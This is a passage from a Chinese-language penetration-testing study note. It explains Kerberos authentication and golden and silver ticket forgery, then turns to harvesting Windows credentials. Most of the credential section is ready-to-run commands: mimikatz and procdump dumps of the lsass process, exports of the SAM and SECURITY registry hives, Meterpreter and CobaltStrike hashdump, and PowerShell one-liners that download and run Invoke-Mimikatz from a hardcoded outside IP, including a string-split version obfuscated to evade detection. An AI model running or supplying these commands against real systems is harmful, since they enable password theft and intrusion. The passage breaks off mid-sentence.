title="2.1 客户端向AS(身份认证服务)发送认证请求"></a>2.1 客户端向AS(身份认证服务)发送认证请求</h5><p>客户端向AS发送认证请求，请求中带有明文的 [用户名] 信息</p><blockquote><p>此时并未发送[密码]或[密钥]信息</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355763.png" alt="image-20220809171208401" style="zoom: 33%;" /><h5 id="2-2-AS确认Client端登录者用户身份"><a href="#2-2-AS确认Client端登录者用户身份" class="headerlink" title="2.2 AS确认Client端登录者用户身份"></a>2.2 AS确认Client端登录者用户身份</h5><ol><li><p>AS收到用户认证请求之后，根据请求中的 [用户名] 信息，从AD数据库(account database)中查找该用户名是否存在。</p></li><li><p>如果 用户名 存在，则根据该用户名提取NTLM Hash做为AS生成的 [<strong>CLIENT 密钥</strong>]，如果第1步中用户提供的 密码 信息正确，并与该用户登录中的 [CLIENT密钥] 是相等的，则进行下一步。</p></li></ol><blockquote><p>注意哦，两次生成的[<strong>CLIENT 密钥</strong>]是不一样的，一个是AS通过调用域控上面存储的对应用户NTML Hash生成的密钥，一个是用户自己登录成功自动生成的[<strong>CLIENT 密钥</strong>]。只有两个密钥相同才认可其身份，这一步基本上就是和上面提到的Windows网络认证基本类似~~</p><p>并且要注意到，第一步只发送了用户名，并未发送密码，所以在AS这边仅仅只做了一个检验该用户身份是否存在的过程，并没有验证其密码是否正确，比对两个[<strong>CLIENT 密钥</strong>]是在哪里发生的呢？是在AS响应的包中，这样操作的意思就是：如果该用户的密码是正确的用户密码，那么他自然可以解开我包中所传递的 [Client&#x2F;TGS SessionKey]~~~这个过程也就是解密AS响应消息中Msg A的过程。Client只有用户密码对了，才能从Msg A中拿到 [Client&#x2F;TGS SessionKey]！！！我们只有拿到了 [Client&#x2F;TGS SessionKey]，才能保证后门和TGS会话的正常！！！！！！！！</p></blockquote><ol start="3"><li>AS为Client响应如下消息：</li></ol><ul><li><p>Msg A 使用 KDC生成的[CLIENT密钥] 加密的 [Client&#x2F;TGS SessionKey]，Client是可以那自己在第一步生成的[CLIENT密钥] 对之解密，拿出 [Client&#x2F;TGS SessionKey]~~~</p></li><li><p>Msg B 使用 [TGS密钥] 加密的TGT，客户端没有KDC NTLM Hash因此Client无法解密TGT。Client仅能持有TGT，拿着TGT再去找TGS要ticket，这是后话</p><p>TGT中包含如下信息：</p></li></ul><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote><ol start="4"><li>Client收到AS的响应消息以后，利用自身的 CLIENT密钥 可以对Msg A进行解密，这样可以获取到 [Client&#x2F;TGS SessionKey] 。但由于Msg B是使用 TGS密钥 加密的，Client无法对其解密。</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355688.png" alt="image-20220809171642114" style="zoom: 33%;" /><blockquote><ul><li>AS响应的消息中有一条是属于Client的，但另外一条却属于TGS。</li><li>Client&#x2F;TGS SessionKey出现了两个Copy，一个给Client端，一个给TGS端。</li><li>认证过程中的加密除哈希外均采用的是对称加密算法</li></ul></blockquote><p>下面图片概述了AS返回的内容~~~</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355771.png" alt="image-20220809171311572" style="zoom: 50%;" /><h4 id="3-请求服务授权"><a href="#3-请求服务授权" class="headerlink" title="3. 请求服务授权"></a>3. 请求服务授权</h4><h5 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h5><p>下图概述了Client向TGS发送的内容：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355676.png" alt="image-20220809171738168" style="zoom:50%;" /><p>客户端发送的请求中包含如下两个消息：</p><ul><li>Msg C</li></ul><blockquote><ul><li>要请求的服务ID, 即[Service ID]</li><li>上一步2.2中由AS为Client提供的TGT</li></ul></blockquote><ul><li>Msg D</li></ul><blockquote><p>使用 [Client&#x2F;TGS SessionKey] 加密的Authenticator 1 {Client ID, Timestamp}</p></blockquote><h5 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h5><h6 id="TGS在响应之前会先解开请求内容："><a href="#TGS在响应之前会先解开请求内容：" class="headerlink" title="TGS在响应之前会先解开请求内容："></a>TGS在响应之前会先解开请求内容：</h6><p>KDC接收到TGT与其他内容后，会首先使用KDC 的NTLM Hash解密TGT，只有KDC可以解密TGT，从TGT中提取到 [Client&#x2F;TGS SessionKey] ，再使用 [Client&#x2F;TGS SessionKey] 解密Authenticator 1，获取到{Client ID, timestamp} 并与通过解密TGT获取到的{Client ID, 有效时间}进行对比，通过则继续响应。如下图</p><blockquote><ul><li>TGT中包含如下信息：</li></ul><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote><p>所以TGT中携带了Client ID以及timestamp~~可以与Msg D中的Authenticator 1 {Client ID, Timestamp}进行对比</p><ul><li>实际上在这个对比Authenticator 1 {Client ID, Timestamp}是否有效的过程，这种认证是双向的，不仅仅是检验了客户端是否是“对的人”，也默认的对KGS端进行了验证~</li></ul><blockquote><p>因为只有KDC 的NTLM Hash对了，才能解密出[Client&#x2F;TGS SessionKey]，才能拿到Authenticator 1</p></blockquote></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355646.png" alt="image-20220809171856218" style="zoom: 33%;" /><h6 id="TGS为Client响应的消息包括："><a href="#TGS为Client响应的消息包括：" class="headerlink" title="TGS为Client响应的消息包括："></a>TGS为Client响应的消息包括：</h6><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote><p>注意，关于Msg E</p><blockquote><p> CLIENT-TO-SERVER TICKET是TGS授予的允许访问票据，但是client无法解密，只有server拿到手后，通过 [SERVICE密钥] 才能解密，以此来确认身份！！！！！</p></blockquote><ul><li>Msg F 使用[Client&#x2F;TGS SessionKey] 加密的 [Client&#x2F;Server SessionKey] 。</li></ul><blockquote><ul><li>Msg F使用了 [Client&#x2F;TGS SessionKey] 加密，因此，该消息对Client可见。Client对其解密以后可获取到 [Client&#x2F;Server SessionKey] 。</li><li>而Msg E使用了 [SERVICE密钥] 加密，该消息可视作是TGS给Service Server的消息，只不过由Client一起携带发送给Service Server</li></ul></blockquote><p>下图为TGS响应消息概览：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355594.png" alt="image-20220809171942456" style="zoom:50%;" /><h4 id="4-发送服务请求"><a href="#4-发送服务请求" class="headerlink" title="4. 发送服务请求"></a>4. 发送服务请求</h4><h5 id="4-1-Client向Service-Server发送服务请求"><a href="#4-1-Client向Service-Server发送服务请求" class="headerlink" title="4.1 Client向Service Server发送服务请求"></a>4.1 Client向Service Server发送服务请求</h5><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355685.png" alt="image-20220809172116925" style="zoom:50%;" /><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong> 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li></ul><blockquote><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote></blockquote><ul><li><strong>Msg G</strong> 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul><blockquote><ol><li>[Client&#x2F;Server SessionKey] 并非直接传输，而是被包含在使用[Service密钥]加密的Msg E中。</li><li>既然 [Client&#x2F;Server SessionKey] 并不直接明文传输， Client需要向Service Server证明自己拥有正确的 [Client&#x2F;Server SessionKey] ，所以，Authenticator 2使用了 [Client&#x2F;Server SessionKey] 加密。</li></ol></blockquote><h5 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h5><ol><li>SS收到客户端的服务请求之后，先利用自身的 [SERVICE密钥] 对Msg E进行解密，提取出Client-To-Server Ticket, 在3.2步骤中，提到了该Ticket中包含了 [Client&#x2F;Server SessionKey] 以及Client ID信息。</li><li>SS使用 [Client&#x2F;Server SessionKey] 解密Msg G，提取Client ID信息，而后将该Client ID与Client-To-Server Ticket中的Client ID进行比对，如果匹配则说明Client拥有正确的 [Client&#x2F;Server SessionKey] 。</li><li>而后，SS向Client响应Msg H(包含使用 [Client&#x2F;Server SessionKey] 加密的Timestamp信息)。</li><li>Client收到SS的响应消息Msg H之后，再使用[Client&#x2F;Server SessionKey] 对其解密，提取Timestamp信息，然后确认该信息与Client发送的Authenticator 2中的Timestamp信息一致。</li></ol><p>如上信息可以看出来，该交互过程起到了Client与SS之间的“双向认证”作用。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208141355614.png" alt="image-20220809172331198" style="zoom:50%;" /><h3 id="kerberos参考"><a href="#kerberos参考" class="headerlink" title="kerberos参考"></a>kerberos参考</h3><blockquote><ul><li><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/">解释像我5：Kerberos – roguelynn</a></li><li>【kerberos协议认证流程详解-哔哩哔哩】 <a href="https://b23.tv/zgPYbXB">https://b23.tv/zgPYbXB</a></li><li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961976(v=technet.10)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961976(v=technet.10)?redirectedfrom=MSDN</a></li><li><a href="https://www.cnblogs.com/huamingao/p/7267423.html">https://www.cnblogs.com/huamingao/p/7267423.html</a></li><li><a href="https://www.cnblogs.com/zpchcbd/p/11707302.html">Kerberos身份验证流程 - zpchcbd - 博客园 (cnblogs.com)</a>！！！！讲的好！！！</li><li><a href="https://juejin.cn/post/6945435504905027598">盘点认证协议 : 普及篇之Kerberos</a>（本文讲的也很不错~~极好）</li></ul></blockquote><h3 id="票据伪造的原理"><a href="#票据伪造的原理" class="headerlink" title="票据伪造的原理"></a>票据伪造的原理</h3><blockquote><p>注：如果难理解黄金票据TGT和白云票据Ticket的伪造原理。那么就请将3.1和4.1两次Client发起的请求做一个对比~~可能就懂了，注意对比两次请求中携带的信息。。注意到TGT和Ticket都是KDC颁发给client的（附带在KDC响应client的包中），但是client并不持有解密密钥，client仅能当“工具人”，仅能持有票据交给TGS和server去打开它~</p><ul><li>3.1Client请求TGS时，携带了：</li></ul><blockquote><ul><li>Msg C</li></ul><blockquote><ul><li>要请求的服务ID, 即[Service ID]</li><li>上一步2.2中由AS为Client提供的使用 [TGS密钥] 加密的TGT</li></ul><blockquote><p>TGT中包含如下信息：</p><blockquote><ul><li>[Client&#x2F;TGS SessionKey]</li><li>Client ID</li><li>Ticket有效时间</li><li>CLient 地址</li></ul></blockquote></blockquote></blockquote><ul><li>Msg D</li></ul><blockquote><p>使用 [Client&#x2F;TGS SessionKey] 加密的Authenticator 1 {Client ID, Timestamp}</p></blockquote></blockquote><ul><li>4.1Client请求server时，携带了：</li></ul><blockquote><ul><li><strong>Msg E</strong> 上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client携带的消息。</li></ul><blockquote><ul><li>Msg E 使用 [SERVICE密钥] (服务器的NTLM HASH) 加密的 CLIENT-TO-SERVER TICKET , 该Ticket中包含了如下信息:</li></ul><blockquote><ul><li>[Client&#x2F;Server SessionKey]</li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></blockquote></blockquote><ul><li><strong>Msg G</strong> 由[Client&#x2F;Server SessionKey]加密的Authenticator 2，包含{Client ID, Timestamp}信息。</li></ul></blockquote></blockquote><ul><li>2.2 AS确认Client端登录者用户身份</li></ul><p>KDC返回的Msg B：使用  [TGS密钥] 加密的TGT，当<strong>我们获取到krbtgt用户的NTLM哈希后</strong>，便可主动使用krbtgt用户的NTLM哈希做为TGS密钥来生成TGT发送给KDC，这样KDC如果通过解密伪造TGT获取到伪造的 [CLIENT&#x2F;TGS SESSIONKEY] 可以成功解密 Authenticator 1 并完成与TGT中的数据进行比对，便成功骗过了KDC，也就是成功伪造了黄金票据（TGT便是黄金票据）</p><blockquote><p>简而言之便是：我们通过伪造的 [TGS密钥] 生成TGT，发送给KDC，来骗取其响应中的和TGS通信的 [CLIENT&#x2F;TGS SESSIONKEY]，并凭借此sessionkey在3.1中伪造成一个正常用户继续向KGS发起请求~~~</p><p>理解的关键在于：在AS返回Client的消息中，有一个Msg B 使用 [TGS密钥] 加密的TGT，Msg B虽然是Client接受，但无法解密，这个东西是他要拿着去带给TGS证明自己身份的~也就是说，如果我们在3.1向TGS请求过程中，携带的Msg B 可以用[TGS密钥] 解密，那就证明了我们的身份（证明我们是正常用户）。</p><p>但是，不凑巧的是，我们破获了 [TGS密钥]，这就是黄金票据的原理~</p></blockquote><ul><li>4.1 Client向SS(Service Server)发送服务请求</li></ul><p>客户端向服务器发送的为使用 SERVICE密钥(服务器的NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET ，在Ticket中包含用来供服务器解密Authenticator 2的 CLIENT&#x2F;SERVER SESSIONKEY 。<strong>如果获取到了Service Server的NTLM</strong><br><strong>Hash</strong>，便可伪造Ticket，和Authenticator 2 ，Service Server在接收到Ticket和Authenticator 2后可以使用自己的NTLM Hash正常解密完成比对，也就是成功伪造了白银票据（访问服务的Ticket即为白银票据）</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/1943">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li><li><a href="https://payloads.online/archivers/2018-11-30/1/">彻底理解Windows认证 - 议题解读 « 倾旋的博客</a></li><li><a href="https://link.zhihu.com/?target=http://wikipedia.moesalih.com/NTLM">NT LAN Manager</a></li><li><a href="https://link.zhihu.com/?target=http://www.voidcn.com/article/p-voxshmho-sn.html">NTLM 协议</a></li><li><a href="https://link.zhihu.com/?target=https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li></ul></blockquote><h1 id="Windows密码凭证获取"><a href="#Windows密码凭证获取" class="headerlink" title="Windows密码凭证获取"></a>Windows密码凭证获取</h1><p>Windows的密码一般存在syskey加密过后的系统文件中（SAM文件）或者是注册表中</p><h2 id="Token窃取与利用"><a href="#Token窃取与利用" class="headerlink" title="Token窃取与利用"></a>Token窃取与利用</h2><p>Windows有两种类型的token：</p><ul><li>Delegation Token（授权令牌）:用来交互会话（用户直接登录，远程桌面登录）</li><li>Impresonation Token（模拟令牌）：用于非交互登录（利用net user访问共享文件夹）</li></ul><p>两种token只在系统注销重启后清除</p><p>具有Delegation Token的用户在注销后，该token将变成impersonation token，依旧有效。</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><blockquote><p>通过Dpapi获取Windows身份凭证<a href="https://xz.aliyun.com/t/6508">https://xz.aliyun.com/t/6508</a></p><p>Mimikatz之DPAPI学习与实践<a href="https://zhuanlan.zhihu.com/p/43888078">https://zhuanlan.zhihu.com/p/43888078</a></p></blockquote><h3 id="Dpapi简述"><a href="#Dpapi简述" class="headerlink" title="Dpapi简述"></a>Dpapi简述</h3><p>从Windows 2000开始，Microsoft随操作系统一起提供了一种特殊的数据保护接口，称为Data Protection Application Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 以用作敏感信息的加密解密。</p><p>其用作范围包括且不限于：</p><ul><li>IE、Chrome的登录表单自动完成</li><li>Powershell加密函数</li><li>Outlook, Windows Mail, Windows Mail, 等邮箱客户端的用户密码。</li><li>FTP管理账户密码</li><li>共享资源文件夹的访问密码</li><li>无线网络帐户密钥和密码</li><li>远程桌面身份凭证</li><li>EFS</li><li>EAP&#x2F;TLS 和 802.1x的身份凭证</li><li>Credential Manager中的数据</li><li>以及各种调用了CryptProtectData函数加密数据的第三方应用，如Skype, Windows Rights Management Services, Windows Media, MSN messenger, Google Talk等。</li><li>etc</li></ul><p>由于功能需求，Dpapi采用的加密类型为对称加密，所以只要找到了密钥(Master Key )，就能解开物理存储的加密信息了。</p><h3 id="Master-Key-Files"><a href="#Master-Key-Files" class="headerlink" title="Master Key Files"></a>Master Key Files</h3><p>存放密钥的文件则被称之为<code>Master Key Files</code>，其路径一般为<code>%APPDATA%/Microsoft/Protect/%SID%</code>。而这个文件中的密钥实际上是<strong>随机64位字节码经过用户密码等信息的加密后的密文</strong>，所以只需要有用户的明文密码&#x2F;Ntlm&#x2F;Sha1就可以还原了。</p><h2 id="系统用户凭证获取"><a href="#系统用户凭证获取" class="headerlink" title="系统用户凭证获取"></a>系统用户凭证获取</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><ul><li><strong>win7和win10mimikatz的使用会存在区别</strong></li><li>要有管理员权限 普通用户无法获取密码</li><li>mimikatz原理就是从系统lsass.exe进程中获取明文密码或者hash，得要用户登录才能从中获取</li></ul><h4 id="mimikatz-for-Win10下载："><a href="#mimikatz-for-Win10下载：" class="headerlink" title="mimikatz for Win10下载："></a>mimikatz for Win10下载：</h4><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p></blockquote><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看mimikatz可以用哪些命令，随便敲两个或者一个：</span><br><span class="line">::查看高级命令模块</span><br><span class="line">：查看基本命令</span><br><span class="line">#选定某个模块后，比如privilege之后，可以继续输入两个::查看具体用法如privilege::</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="本地非交互式凭证获取："><a href="#本地非交互式凭证获取：" class="headerlink" title="本地非交互式凭证获取："></a>本地非交互式凭证获取：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe &quot;log res.txt&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line">win7:</span><br><span class="line">mimikatz.exe &quot;log logon.txt&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h4 id="交互式："><a href="#交互式：" class="headerlink" title="交互式："></a>交互式：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.0版本</span><br><span class="line">privilege::debug    </span><br><span class="line">//提升权限,提升到调试权限，才能获取到lsass.exe进程中保存的密码。另外需要有管理员权限才能提升至debug</span><br><span class="line">sekurlsa::logonpasswords    </span><br><span class="line">//抓取密码</span><br><span class="line">1.X版本</span><br><span class="line">privilege::debug    //提升权限</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   //将 sekurlsa.dll 注入到 lsass.exe 进程里</span><br><span class="line">@getLogonPasswords     //获取密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate#窃取、冒充令牌,获取与令牌对应的权限，该命令可以查看我们可以窃取哪些token</span><br><span class="line">lsadump::sam#列出密码凭证及用户信息,可以得到一些ntml hash </span><br><span class="line">#拿到hash后就可以尝试解析明文或者hash传递攻击</span><br><span class="line">lsadump::secrets#Get the SysKey to decrypt SECRETS entries (from registry or hives)</span><br><span class="line">   #获取系统密钥以解密文条目（从注册表或配置单元获取）</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">win7：可以直接获得明文密码</span><br><span class="line">privilege::debug    </span><br><span class="line">sekurlsa::logonpasswords </span><br></pre></td></tr></table></figure><h3 id="Powershell脚本"><a href="#Powershell脚本" class="headerlink" title="Powershell脚本"></a>Powershell脚本</h3><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a><br><a href="https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1</a></p></blockquote><p>Powershell本地加载mimikatz脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;&#x27;</span><br></pre></td></tr></table></figure><p>Powershell远程加载mimikatz脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://47.101.214.85:8000/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure><p>powershell混淆:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;47.101.214&#x27;+&#x27;.85:8000/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure><p>Powershell 加载 Get-PassHashes脚本：</p><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object net.webclient).downloadstring(&#x27;http://47.101.214.85:8000/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure><h3 id="procdump-mimikatz"><a href="#procdump-mimikatz" class="headerlink" title="procdump+mimikatz"></a>procdump+mimikatz</h3><p>Procdump下载： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br>Procdump lsass  进程导出:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For 32bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">For 64bits：</span><br><span class="line">procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后使用 mimikatz  还原密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h3 id="注册表导出Hash"><a href="#注册表导出Hash" class="headerlink" title="注册表导出Hash"></a>注册表导出Hash</h3><p>reg save命令 保存注册表</p><p>HKLM是HKEY_LOCAL_MACHINE的缩写</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208072236447.png" alt="image-20220807223639163" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们解析sam.hiv需要使用system.hiv中的key，所以需要先解密system.hiv</span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure><p>mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure><p>impacket：</p><blockquote><p><a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">https://github.com/SecureAuthCorp/impacket/tree/master/examples</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><blockquote><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line"># 如果提示找不到 Crypto 模块， 就到 pip包安装位置C:\Users\[User]\AppData\Roaming\Python\Python38\site-packages把crypto文件夹重命名为Crypto</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290811830.png" alt="image-20220729081127638"></p><h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3><ul><li>Hashdump</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump    //system权限的meterpreter</span><br><span class="line">set session 1</span><br><span class="line">exploit //结果保存在tmp目录下</span><br><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>Hash格式： 用户名称:RID:LM-HASH值:NTLM-HASH值</p><ul><li>Mimikatz</li></ul><p>Hashdump 使用的是 mimikatz 的部分功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load mimikatz   //加载模块</span><br><span class="line">wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp    //获取用户密码的hash值</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f ::   //查询有哪些模块</span><br><span class="line">mimikatz_command -f  samdump::hashes    //从windows的sam文件中读取密码hash值</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords   //获取明文密码</span><br><span class="line">mimikatz_command -f samdump::bootkey</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msf6</span><br><span class="line">load kiwi</span><br><span class="line">help kiwi</span><br><span class="line">creds_all  //列举系统中的明文密码</span><br><span class="line">lsa_dump_sam  //读取sam文件</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords  //kiwi_cmd命令后面接mimikatz的命令</span><br></pre></td></tr></table></figure><h3 id="CobaltStrike获取Hash"><a href="#CobaltStrike获取Hash" class="headerlink" title="CobaltStrike获取Hash"></a>CobaltStrike获取Hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="其他密码凭证获取"><a href="#其他密码凭证获取" class="headerlink" title="其他密码凭证获取"></a>其他密码凭证获取</h2><h3 id="1-RDP连接密码解密"><a href="#1-RDP连接密码解密" class="headerlink" title="1 RDP连接密码解密"></a>1 RDP连接密码解密</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul><li>查看本地机器本地连接过的目标机器。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure><ul><li>查看本地用户此目录下是否存有RDP密码文件</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1E85A94EE31F584E484B8120E3ADA266</span><br><span class="line">9D4E7B34E2541E8AB9F716D127DFFC87</span><br><span class="line">AAAD88ECA44F5AAA1754B5E18F7EB12D</span><br><span class="line">DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">E05DBE15D38053457F3523A375594044</span><br></pre></td></tr></table></figure><ul><li>查看保存在本地的远程主机信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><ul><li>选择一个密码文件对其进行解密。</li></ul><p>此处需要记录下 guidMasterKey 